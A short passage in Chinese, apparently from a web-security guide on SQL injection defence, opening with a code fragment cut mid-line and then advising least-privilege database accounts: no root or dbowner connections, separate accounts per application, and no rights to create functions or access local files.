+"'";在最后，从数据库自身的角度来说，应该使用最小权限原则，避免Web应用直接使用root、dbowner等高权限账户直接连接数据库。如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户。Web应用使用的数据库账户，不应该有创建自定义函数、操作本地文件的权限。